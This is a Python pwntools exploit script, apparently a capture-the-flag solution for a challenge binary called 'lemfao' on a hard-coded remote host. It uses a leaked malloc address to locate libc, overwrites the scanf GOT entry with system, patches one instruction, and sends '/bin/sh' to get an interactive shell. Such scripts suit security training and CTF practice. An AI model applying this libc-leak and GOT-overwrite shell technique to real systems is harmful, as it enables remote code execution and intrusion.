#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.152.242.68 --port 10024 lemfao
import os

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "lemfao")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or "103.152.242.68"
port = int(args.PORT or 10027)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
break *main+156
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'
libc = ELF("./libc.so.6")

io = start()

malloc_addr_leak = int(io.recvline().strip().split(b": ")[-1].decode()[2:], 16)

libc.address = malloc_addr_leak - libc.symbols["malloc"]

log.info("malloc_addr_leak: " + hex(malloc_addr_leak))
log.info("libc.address: " + hex(libc.address))

bin_sh = b"/bin/sh\x00"

bin_sh_int = int.from_bytes(bin_sh, "little")
print(bin_sh_int)

io.sendlineafter(b"lemfao?", bin_sh)

print(hex(exe.got["puts"]))

replacing = {
    # `48 8d 3d d0 00 00 00     lea    rdi,  [rip+0xd0]        # 0xd7` -> `48 8d 3d 6e 08 20 00     lea    rdi,  [rip+0x20086e]        # 0x200875`
    str(exe.got["__isoc99_scanf"]).encode(): str(libc.symbols["system"]).encode(),
    str(0x400957).encode(): str(0xE80002086E3D8D48).encode(),
}
# replacing = {
#     str(exe.got["fgets"]).encode(): str(libc.symbols["system"]).encode(),
#     str(exe.got["puts"]).encode(): str(exe.symbols["main"]).encode(),
# }

for addr, value in replacing.items():
    io.sendlineafter(b"hm...?", addr)
    io.sendlineafter(b"huh...", value)

io.sendlineafter(b"lemfao?", bin_sh)

io.interactive()
